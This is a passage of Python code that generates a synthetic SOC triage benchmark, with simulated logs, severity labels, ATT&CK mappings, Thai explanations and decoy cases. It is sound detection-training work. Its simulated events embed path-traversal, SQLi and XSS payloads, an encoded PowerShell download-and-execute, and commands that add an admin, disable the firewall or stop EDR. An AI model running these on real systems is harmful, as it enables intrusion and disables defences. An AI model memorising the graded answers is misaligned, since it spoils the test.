    r2 = EV.bind_q(b, d, h, sdom, "A")
    ben([r1, r2], "proxy ปฏิเสธ (TCP_DENIED/403) การเข้าเว็บสตรีมมิงตามนโยบายหมวดหมู่ในช่วงพักกลางวัน = การบังคับใช้นโยบายการใช้งาน ไม่ใช่ภัยคุกคาม",
        sev="info")


# ======================================================================
# MIX & DECOYS: decouple severity<->label (N4) and task_type<->label (N5),
# add benign sequences that look like a chain (decoys).
# ======================================================================

def mix_and_decoys(b):
    e = b.ent

    # ---------- malicious-LOW (attempted/blocked, no impact) ----------
    # ML1: external port scan of one DMZ host, fully blocked -> low, T1595
    atk = A.alloc_ext("ml_scan")
    refs = []
    b.hint("any")
    for i in range(8):
        dd = dt(b, 2026, 11, 12, 3, 10, s=(i * 7 + 3) % 59)
        refs.append(EV.pan_traffic(b, dd, "PA-DMZ", "deny", atk, A.ip("SRV-WEB01"),
                    "incomplete", "deny", [80, 443, 22, 3389, 8080][i % 5],
                    outbound=False, end_reason="policy-deny", dcountry="US"))
    refs.append(EV.pan_threat(b, dt(b, 2026, 11, 12, 3, 11), "PA-DMZ", "scan",
                atk, "SRV-WEB01", "not-applicable", "drop", "",
                "TCP Port Scan", 0, "scan", "low", 0, inbound=True, dport=0))
    b.add_case("triage_severity", P("triage_severity"), refs,
               "low", True, ["T1595"], [ioc("ip", atk)],
               "สแกนพอร์ตจากภายนอกมายัง SRV-WEB01 โฮสต์เดียว ถูกไฟร์วอลล์ปฏิเสธทุกพอร์ต (PAN แจ้ง TCP Port Scan ระดับ low) ไม่มีการเชื่อมต่อสำเร็จ = Active Scanning (พยายาม) ไม่มีผลกระทบจึง low")

    # ML2: WAF-blocked exploit attempt, no follow-up -> low, malicious
    aip = A.alloc_ext("ml_waf")
    b.hint("any")
    d = dt(b, 2026, 11, 12, 4, 20)
    EV.web_inbound(b, d - datetime.timedelta(milliseconds=410), aip, "SRV-WEB01")
    r = EV.f5(b, d, [
        ("policy_name", "prod_web_asm"),
        ("violations", "Attack signature detected"),
        ("sig_names", "Path Traversal"), ("request_status", "blocked"),
        ("ip_client", aip), ("method", "GET"),
        ("uri", "/static?f=..%2f..%2f..%2fetc%2fpasswd"),
        ("response_code", "403"), ("severity", "Warning")])
    b.add_case("triage_severity", P("triage_severity"), [r],
               "low", True, ["T1190"], [ioc("ip", aip)],
               "F5 ASM บล็อก path traversal ครั้งเดียวจาก IP ที่ไม่อยู่ในรายการ pentest ไม่มีการตามต่อ = ความพยายาม Exploit ที่ถูกบล็อก ไม่มีผลกระทบจึง low")

    # ML3: blocked outbound to flagged domain, single attempt -> low, malicious
    bdom = f"cdn-{e._hex(4)}.pkg-mirror.example"; bip = A.alloc_ext("ml_block")
    b.hint("biz", who=["bwong"])
    h = home("bwong")
    r2 = EV.bind_q(b, dt(b, 2026, 11, 12, 5, 2), h, bdom, "A")
    r1 = EV.squid(b, dt(b, 2026, 11, 12, 5, 2), h, "CONNECT",
                  f"{bdom}:443", "bwong", 0, bip, result="TCP_DENIED/403")
    b.add_case("ioc_extraction", P("ioc_extraction"), [r1, r2],
               "low", True, ["T1071.001"], [ioc("domain", bdom)],
               "proxy ปฏิเสธการเชื่อมต่อออกไปโดเมนที่ถูกจัดกลุ่ม malware (403) ครั้งเดียว โดยเป็นโดเมนรูปแบบสุ่มเดียวกับ C2 = ความพยายามติดต่อ C2 ที่ถูกบล็อก low")

    # ML4: failed privilege escalation -> low, T1033 + T1098.007 (attempt)
    b.hint("biz", who=["schan"])
    h = home("schan")
    r = EV.sec_4688(b, dt(b, 2026, 11, 12, 6, 15), h, "schan",
                    r"C:\Windows\System32\whoami.exe", "whoami /priv", CMD)
    r2 = EV.sec_4688(b, dt(b, 2026, 11, 12, 6, 16), h, "schan",
                     r"C:\Windows\System32\net.exe",
                     "net localgroup administrators schan /add", CMD)
    b.add_case("attack_mapping", P("attack_mapping"), [r, r2],
               "low", True, ["T1033", "T1098.007"], [],
               "ผู้ใช้ทั่วไปรัน whoami /priv (System Owner/User Discovery) แล้วพยายามเพิ่มตนเองเข้า local administrators (Additional Local or Domain Groups — ไม่สำเร็จ ไม่มี 4732 ตามมา) ยังไม่มีผลจึง low")

    # ---------- benign-MEDIUM (policy violation / unusual-but-authorized) ----------
    b.hint("evening", who=[ADM])
    r = EV.sec_4688(b, dt(b, 2026, 11, 11, 20, 10), "SRV-APP01", ADM,
                    r"C:\Windows\System32\netsh.exe",
                    "netsh advfirewall set allprofiles state off", CMD,
                    integrity="High")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "medium", False, [], [],
               f"{ADM} (แอดมิน IT ตาม environment.json) ปิด Windows Firewall ทุกโปรไฟล์บน SRV-APP01 นอกเวลางาน = การกระทำของผู้ดูแลจริงแต่ผิด policy (ลดการป้องกัน) จัด medium เพื่อให้ทีมตรวจสอบ ไม่ใช่การบุกรุก",
               is_fp_trap=True, fp_trap_kind="admin_policy_violation")

    # BM2: service account used interactively off-hours (benign, misconfig)
    #      (v4: svc_report on SRV-APP01 -- unrelated to any campaign account)
    b.hint("evening", who=["svc_report"])
    rr, lid = EV.sec_4624(b, dt(b, 2026, 11, 11, 22, 40), "SRV-APP01", "svc_report", 2)
    b.add_case("triage_severity", P("triage_severity"), [rr],
               "medium", False, [], [],
               "บัญชีบริการ svc_report ถูกใช้ล็อกออน interactive (type 2, ที่หน้าเครื่อง) บน SRV-APP01 นอกเวลางาน ไม่มีล็อกออนจากเครือข่ายหรือกิจกรรมอื่นตามมา = ผู้ดูแลเข้าหน้าเครื่องด้วยบัญชีบริการ ผิดแนวปฏิบัติแต่ไม่ใช่การโจมตี จัด medium",
               is_fp_trap=True, fp_trap_kind="svc_interactive_logon")

    # BM3: bulk file access by backup account during the day -> medium benign
    refs = []
    b.hint("biz", who=["svc_backup"])
    for i in range(3):
        dd = dt(b, 2026, 11, 11, 13, 30 + i)
        rr, _l = EV.sec_4624(b, dd, "SRV-FILE01", "svc_backup", 3,
                             A.ip("SRV-BACKUP01"), "SRV-BACKUP01", auth="Kerberos")
        refs.append(rr)
    b.add_case("triage_severity", P("triage_severity"), refs,
               "medium", False, [], [],
               "บัญชี svc_backup ล็อกออนจาก SRV-BACKUP01 เข้าไฟล์แชร์ซ้ำช่วงกลางวัน (ปกติทำกลางคืน) = หน้าต่างสำรองข้อมูลผิดเวลา ต้นทางเป็นเครื่อง backup จริง จัด medium ให้ตรวจสอบ",
               is_fp_trap=True, fp_trap_kind="offwindow_backup")

    # BM4: admin creates scheduled task (change not ticketed) -> medium benign
    b.hint("biz", who=[ADM])
    r = EV.sec_4698(b, dt(b, 2026, 11, 11, 18, 5), "SRV-APP01",
                    "\\CorpIT\\CollectInventory", ADM,
                    r"C:\Program Files\CorpIT\inv.exe", "/run")
    b.add_case("attack_mapping", P("attack_mapping"), [r],
               "medium", False, [], [],
               f"{ADM} สร้าง scheduled task ใหม่ (CorpIT\\CollectInventory) ชี้ไบนารี inventory ใน Program Files ที่พบทั่วองค์กร = งาน IT จริงแต่ไม่มี change ticket ใน environment.json จัด medium ให้ตรวจสอบ ไม่ใช่ persistence ของผู้โจมตี",
               is_fp_trap=True, fp_trap_kind="untracked_change")

    # ---------- benign DECOYS that look like an attack chain ----------
    # D1: legit SCCM software rollout across hosts (looks like lateral movement)
    refs = []
    b.hint("night", who=["svc_sccm"])
    for hh in ("WKS-GEN-003", "WKS-GEN-004", "WKS-GEN-006"):
        dd = dt(b, 2026, 11, 11, 2, 15)
        rr, _l = EV.sec_4624(b, dd, hh, "svc_sccm", 3, A.ip("SRV-SCCM01"),
                             "SRV-SCCM01", auth="Kerberos")
        refs.append(rr)
        refs.append(EV.sys_7045(b, dd, hh, "CcmExec", CCMEXEC,
                    account="LocalSystem", installer="svc_sccm"))
    b.add_case("campaign_reconstruction", P("campaign_reconstruction"), refs,
               "info", False, [], [],
               "svc_sccm ล็อกออน network จาก SRV-SCCM01 เข้าหลายเครื่องแล้วติดตั้งบริการ CcmExec พร้อมกัน = การกระจาย SCCM client ปกติ ดูคล้ายการเคลื่อนที่ด้านข้างแต่ไม่ใช่แคมเปญโจมตี (decoy)",
               is_decoy=True)

    # D2: nightly backup touches many servers + opens lsass handle
    refs = []
    b.hint("night", who=["svc_backup"])
    for hh in ("SRV-SQL01", "SRV-APP01", "SRV-FILE01"):
        dd = dt(b, 2026, 11, 11, 1, 20)
        rr, _l = EV.sec_4624(b, dd, hh, "svc_backup", 3, A.ip("SRV-BACKUP01"),
                             "SRV-BACKUP01", auth="Kerberos")
        refs.append(rr)
        refs.append(EV.sm10(b, dd, hh,
                    r"C:\Program Files\Veeam\Backup\VeeamAgent.exe", LSASS,
                    "0x1000", "svc_backup", legit=True, tag="boot"))
    b.add_case("campaign_reconstruction", P("campaign_reconstruction"), refs,
               "info", False, [], [],
               "VeeamAgent บนบัญชี svc_backup เข้าถึงหลายเซิร์ฟเวอร์และเปิด handle lsass (0x1000, QUERY) ตอนกลางคืน = งานสำรองข้อมูลปกติ ดูคล้าย credential dumping + lateral แต่เป็น decoy ไม่ใช่แคมเปญ",
               is_decoy=True)

    # D3: SCCM patch rollout (v4: evidence added -- ccmcache path, parent
    #     CcmExec, installer SYSTEM via SCCM, change record in environment.json)
    refs = []
    b.hint("night")
    d0 = dt(b, 2026, 11, 12, 1, 5)
    for hh in ("WKS-GEN-008", "WKS-GEN-009"):
        dd = dt(b, 2026, 11, 12, 1, 5)
        img = r"C:\Windows\ccmcache\4f\wuaupatch.exe"
        refs.append(EV.sm1(b, dd, hh, img, f'"{img}" /quiet /norestart', "SYSTEM",
                           CCMEXEC, f'"{CCMEXEC}"', integrity="System",
                           company="Microsoft Corporation",
                           description="Windows Update Patch Helper",
                           tag="d3", parent_tag="boot"))
        refs.append(EV.sys_7045(b, dd, hh, "wuauserv-patch", img,
                    account="LocalSystem", installer="SYSTEM"))
        refs.append(EV.sys_7036(b, dd, hh, "Windows Update", "running"))
    b.add_change("CHG-2611-0102", d0 - datetime.timedelta(minutes=15),
                 d0 + datetime.timedelta(hours=2), ["WKS-GEN-008", "WKS-GEN-009"],
                 "SCCM patch rollout (deployment CM00457, wuaupatch.exe จาก ccmcache) หน้าต่าง maintenance")
    b.add_case("campaign_reconstruction", P("campaign_reconstruction"), refs,
               "info", False, [], [],
               "บริการแพตช์ถูกติดตั้งพร้อมกันสองเครื่อง: ไบนารีอยู่ใน C:\\Windows\\ccmcache (cache ของ SCCM) parent คือ CcmExec.exe ติดตั้งโดย SYSTEM และตรงกับ change CHG-2611-0102 ใน environment.json = การลงแพตช์ผ่าน SCCM ปกติ ดูคล้ายการวาง persistence เป็นชุดแต่เป็น decoy",
               is_decoy=True)

    # HT3: approved external pentest against SRV-WEB01 (F5 Critical + PAN high)
    pt_ip = A.alloc_ext("pentest_vendor")
    b.pentest_ips.append(pt_ip)
    refs = []
    b.hint("biz")
    d0 = dt(b, 2026, 11, 10, 14, 0)
    for i in range(3):
        dd = dt(b, 2026, 11, 10, 14, 2 + i, s=5 + i * 13)
        refs.append(EV.pan_traffic(b, dd, "PA-DMZ", "deny", pt_ip, A.ip("SRV-WEB01"),
                    "incomplete", "deny", [8443, 3389, 22][i], outbound=False,
                    end_reason="policy-deny"))
    for i, (sig, uri) in enumerate([("SQL-Injection (parameter)", "/product?id=1%27%20UNION%20SELECT%20NULL--"),
                                    ("Cross Site Scripting (XSS)", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E")]):
        dd = dt(b, 2026, 11, 10, 14, 10 + i * 3)
        EV.web_inbound(b, dd - datetime.timedelta(milliseconds=300), pt_ip, "SRV-WEB01")
        refs.append(EV.f5(b, dd, [("policy_name", "prod_web_asm"),
                                  ("violations", "Attack signature detected"),
                                  ("sig_names", sig), ("request_status", "blocked"),
                                  ("ip_client", pt_ip), ("method", "GET"),
                                  ("uri", uri), ("response_code", "403"),
                                  ("severity", "Critical")]))
    refs.append(EV.pan_threat(b, dt(b, 2026, 11, 10, 14, 16), "PA-DMZ",
                "vulnerability", pt_ip, "SRV-WEB01", "web-browsing", "reset-both",
                "/product", "SQL Injection Attempt", 0, "sql-injection", "high", 0,
                inbound=True))
    b.add_change("PT-2611-01", d0 - datetime.timedelta(minutes=30),
                 d0 + datetime.timedelta(hours=4), ["SRV-WEB01"],
                 f"External penetration test (ผู้ให้บริการภายนอก, source IP {pt_ip}) ต่อ SRV-WEB01 อนุมัติโดย CISO",
                 kind="pentest")
    b.add_case("campaign_reconstruction", P("campaign_reconstruction"), refs,
               "low", False, [], [ioc("ip", pt_ip)],
               f"สแกนพอร์ต + F5 signature ระดับ Critical (SQLi/XSS ถูกบล็อก) + PAN SQL Injection ระดับ high จาก {pt_ip} ซึ่งเป็น IP ของผู้ทดสอบเจาะระบบที่อนุมัติใน PT-2611-01 (environment.json) และอยู่ในช่วงเวลาที่อนุมัติ = pentest ที่ชอบด้วยกฎ ไม่ใช่แคมเปญโจมตี (alert แรงแต่ benign)",
               is_fp_trap=True, fp_trap_kind="approved_pentest_critical_waf")

    # ---------- benign ioc_extraction / correlation ----------
    cdom = f"assets-{e._hex(4)}.cdn-assets.example"
    cip = A.alloc_ext("legit_edge.cdn-assets.example", noise=True)
    b.hint("biz", who=["mwhite"])
    h = home("mwhite")
    r1 = EV.sm22(b, dt(b, 2026, 11, 11, 14, 0), h,
                 r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                 cdom, f"type: 5 edge.cdn-assets.example;::ffff:{cip}", "mwhite",
                 tag="mwhite-chrome")
    r2 = EV.bind_q(b, dt(b, 2026, 11, 11, 14, 0), h, cdom, "A")
    b.add_case("ioc_extraction", P("ioc_extraction"), [r1, r2],
               "info", False, [], [ioc("domain", cdom), ioc("ip", cip)],
               "สกัดได้โดเมน/IP ของ CDN (cdn-assets.example, CNAME edge) ที่ Chrome เรียก และ IP เดียวกันปรากฏใน traffic ปกติจำนวนมาก = ตัวบ่งชี้ที่ไม่เป็นอันตราย ควรระบุว่า benign",
               is_fp_trap=True, fp_trap_kind="benign_ioc")

    b.hint("biz", who=["mwhite"])
    h = home("mwhite")
    r2 = EV.cp(b, dt(b, 2026, 11, 11, 10, 5), "Accept", "Accept",
               A.ip(h), A.ip("SRV-FILE01"), 445, rule="Internal-FileShare")
    rr, lid = EV.sec_4624(b, dt(b, 2026, 11, 11, 10, 5), "SRV-FILE01", "mwhite",
                          3, A.ip(h), h, auth="Kerberos")
    b.add_case("correlation", P("correlation"), [rr, r2],
               "info", False, [], [],
               "ล็อกออน network ของ mwhite เข้า SRV-FILE01 (Kerberos) จากเครื่องประจำของตน ตรงกับ Check Point allow SMB จากเครื่องเดียวกัน = เซสชันไฟล์แชร์ปกติที่ยืนยันได้สองแหล่ง (correlate ได้แต่ benign)",
               correlation_keys=[f"src:{h}", "dst:SRV-FILE01"],
               is_fp_trap=True, fp_trap_kind="benign_correlation")

    # ---------- extra malicious TRIAGE ----------
    # MT1: NTLM brute then success against svc_etl on SRV-SQL01
    atk2 = home("ypat")
    refs = []
    b.hint("any", who=["svc_etl", "ypat"])
    for i in range(5):
        dd = dt(b, 2026, 11, 11, 16, 2, s=(i * 11 + 5) % 59)
        refs.append(EV.sec_4625(b, dd, "SRV-SQL01", "svc_etl", 3,
                    A.ip(atk2), atk2, user_exists=True, auth="NTLM"))
    rr, _l = EV.sec_4624(b, dt(b, 2026, 11, 11, 16, 3), "SRV-SQL01", "svc_etl",
                         3, A.ip(atk2), atk2, auth="NTLM")
    refs.append(rr)
    b.add_case("triage_severity", P("triage_severity"), refs,
               "high", True, ["T1110.001"], [],
               "ล็อกออน NTLM ล้มเหลวซ้ำ (SubStatus 0xc000006a) ต่อ svc_etl จากเวิร์กสเตชันผู้ใช้แล้วสำเร็จ = การเดารหัสผ่านบัญชีบริการสำเร็จ (บัญชีบริการไม่ควรล็อกออนจากเครื่องผู้ใช้) high")

    # MT2: suspicious encoded PowerShell from user host (rsiri)
    b.hint("biz", who=["rsiri"])
    h = home("rsiri")
    mdom = f"img-{e._hex(4)}.static-cdn.example"
    enc = enc_ps(f"$w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();IEX $w.DownloadString('hxxps://{defang(mdom)}/c')")
    r = EV.sec_4688(b, dt(b, 2026, 11, 11, 15, 50), h, "rsiri", PS,
                    "powershell.exe -nop -w hidden -enc " + enc, EXPL,
                    integrity="Medium")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "high", True, ["T1059.001", "T1027"], [],
               "powershell -enc แบบ hidden ถูกเรียกจาก explorer บนเครื่องผู้ใช้ decode ได้เป็น download-and-execute จากโดเมนภายนอก = การรันสคริปต์ที่ obfuscate น่าสงสัยสูง")

    # MT3: clear-text cred in command line / net use with password (jtana)
    b.hint("biz", who=["jtana"])
    h = home("jtana")
    r = EV.sec_4688(b, dt(b, 2026, 11, 11, 17, 5), h, "jtana", r"C:\Windows\System32\net.exe",
                    r'net use \\SRV-FILE01\c$ /user:administrator P@ssw0rd!23', CMD)
    b.add_case("triage_severity", P("triage_severity"), [r],
               "medium", True, ["T1021.002"], [],
               "ผู้ใช้ทั่วไปใช้ net use เชื่อม C$ ของ SRV-FILE01 ด้วยบัญชี administrator พร้อมรหัสผ่านใน command line = ความพยายามเข้าถึง admin share (lateral) medium")

    # MT4: stop + disable EDR service (wpan) -> T1685 (Impair Defenses)
    b.hint("biz", who=["wpan"])
    h = home("wpan")
    r = EV.sec_4688(b, dt(b, 2026, 11, 12, 7, 2), h, "wpan", CMD,
                    "cmd /c sc stop Sense & sc config Sense start= disabled", EXPL,
                    integrity="High")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "high", True, ["T1685"], [],
               "หยุดและปิดบริการ EDR (Sense) บนเครื่องผู้ใช้ = Impair Defenses (T1685 หลัง T1562.001 ถูก revoke; ไม่ใช่ Service Stop) high")

    # MT5: outbound to raw-IP on nonstandard port (lkit) -- weak vendor alert
    b.hint("biz", who=["lkit"])
    h = home("lkit")
    rip = A.alloc_ext("mt_raw")
    d = dt(b, 2026, 11, 12, 8, 20)
    sp = b.rng.randint(49152, 65535)
    r = EV.sm3(b, d, h, r"C:\Users\Public\tmp.exe", "lkit", A.ip(h),
               sp, rip, 8443)
    r2 = EV.fgt(b, d, "FGT-EDGE", "utm", "app-ctrl", "notice", h, rip, 8443,
                "pass", "tcp/8443", "Unknown.TCP", "unknown",
                logid="1059028704", sport=sp,
                extra='appid=0 apprisk="elevated" crlevel="low" incidentserialno=0')
    b.add_case("triage_severity", P("triage_severity"), [r, r2],
               "medium", True, ["T1571"], [ioc("ip", rip)],
               "กระบวนการใน C:\\Users\\Public เชื่อมต่อออกไป IP ภายนอกโดยตรงบนพอร์ตไม่มาตรฐาน 8443 (FortiGate เห็นเป็น Unknown.TCP ระดับ low เท่านั้น) = Non-Standard Port น่าสงสัย medium")


# ======================================================================
# v4.2: benign / trap cases on the DMZ hosts SRV-RDS01 and SRV-WEB02 so the
# host alone no longer implies "malicious" (Security Audit round 5).
# ======================================================================

MSDEP = r"C:\Program Files\IIS\Microsoft Web Deploy V3\MsDepSvc.exe"
APPCMD = r"C:\Windows\System32\inetsrv\appcmd.exe"


def dmz_benign(b):
    # BT-RDS: staff member working from home mistypes the (just expired)
    # password twice, helpdesk resets it under a service request, then the
    # RDP session succeeds -- same IP the user always connects from.
    u = "opas"
    hip = A.alloc_ext("homeisp_" + u, noise=True)
    b.hint("biz", who=[u, "SRV-RDS01"])
    d = dt(b, 2026, 11, 12, 8, 41)
    refs = []
    for i in range(2):
        dd = d + datetime.timedelta(seconds=19 * i + b.rng.randint(3, 9))
        sp = EV.rdp_inbound(b, dd, hip, "SRV-RDS01", ok=False)
        refs.append(EV.sec_4625(b, dd, "SRV-RDS01", u, 3, hip, "-",
                                user_exists=True, auth="NTLM", ip_port=sp))
    dok = d + datetime.timedelta(minutes=9, seconds=b.rng.randint(5, 50))
    sp = EV.rdp_inbound(b, dok, hip, "SRV-RDS01", ok=True,
                        session_s=b.rng.randint(5400, 9000))
    r_ok, _lid = EV.sec_4624(b, dok, "SRV-RDS01", u, 10, hip, "-",
                             auth="Negotiate", ip_port=sp)
    refs.append(r_ok)
    EV.sec_4688(b, dok + datetime.timedelta(seconds=b.rng.randint(4, 12)), "SRV-RDS01", u,
                r"C:\Windows\System32\rdpclip.exe", "rdpclip",
                r"C:\Windows\System32\svchost.exe")
    b.add_change("SR-2611-0457", d + datetime.timedelta(minutes=2),
                 d + datetime.timedelta(minutes=40), ["SRV-RDS01"],
                 f"helpdesk รีเซ็ตรหัสผ่านให้ {u} (รหัสผ่านหมดอายุ ทำงานจากบ้านผ่าน SRV-RDS01) ตามคำขอ SR-2611-0457",
                 kind="service_request")
    b.add_case("triage_severity", P("triage_severity"), refs,
               "info", False, [], [],
               f"4625 สองครั้ง (type 3/NLA, SubStatus 0xc000006a) ของบัญชีผู้ใช้จริง {u} จาก IP บ้านเดิมของผู้ใช้ ห่างกันราว 20 วินาที ไม่มีการลองหลายบัญชี จากนั้น helpdesk รีเซ็ตรหัสผ่านตาม SR-2611-0457 (environment.json) และ RDP (type 10) สำเร็จใน ~9 นาที = ผู้ใช้ WFH พิมพ์รหัสผิด/รหัสหมดอายุ ไม่ใช่ brute force",
               is_fp_trap=True, fp_trap_kind="rds_wfh_password_reset")

    # BT-WEB02: approved Web Deploy release on the partner portal. New .aspx
    # and .dll land in wwwroot (looks like a web shell drop) but the writer is
    # MsDepSvc during change CHG-2611-1415 and nothing is spawned by w3wp.
    b.hint("biz", who=["svc_deploy@SRV-WEB02", "SRV-WEB02"])
    d = dt(b, 2026, 11, 9, 19, 5)
    r1, _l = EV.sec_4624(b, d, "SRV-WEB02", "svc_deploy", 3, A.ip("JUMP01"),
                         "JUMP01", auth="Kerberos")
    r2 = EV.sm11(b, d + datetime.timedelta(seconds=b.rng.randint(6, 14)), "SRV-WEB02",
                 MSDEP, r"C:\inetpub\wwwroot\Views\Invoice.aspx", "SYSTEM",
                 tag="webdeploy")
    r3 = EV.sm11(b, d + datetime.timedelta(seconds=b.rng.randint(15, 25)), "SRV-WEB02",
                 MSDEP, r"C:\inetpub\wwwroot\bin\Partner.Portal.dll", "SYSTEM",
                 tag="webdeploy")
    r4 = EV.sm1(b, d + datetime.timedelta(seconds=b.rng.randint(30, 45)), "SRV-WEB02",
                APPCMD, r"C:\Windows\system32\inetsrv\appcmd.exe recycle apppool /apppool.name:PartnerAppPool",
                "SYSTEM", MSDEP, f'"{MSDEP}"', integrity="System",
                company="Microsoft Corporation", parent_tag="webdeploy")
    b.add_change("CHG-2611-1415", d - datetime.timedelta(minutes=15),
                 d + datetime.timedelta(hours=1), ["SRV-WEB02"],
                 "release partner portal v3.8 บน SRV-WEB02 ผ่าน Web Deploy (MsDepSvc) จาก JUMP01 ด้วย svc_deploy",
                 kind="change")
    b.add_case("attack_mapping", P("attack_mapping"), [r1, r2, r3, r4],
               "info", False, [], [],
               "ไฟล์ .aspx/.dll ใหม่ใน wwwroot ของ SRV-WEB02 ถูกเขียนโดย MsDepSvc.exe (Web Deploy) ไม่ใช่ w3wp หลัง svc_deploy ล็อกออน type 3 จาก JUMP01 แล้ว recycle app pool ด้วย appcmd ภายในช่วง change CHG-2611-1415 (environment.json) และไม่มี process ลูกจาก w3wp = การ deploy แอปตามแผน ไม่ใช่ web shell จึงไม่มีเทคนิค ATT&CK",
               is_fp_trap=True, fp_trap_kind="iis_webdeploy_release")
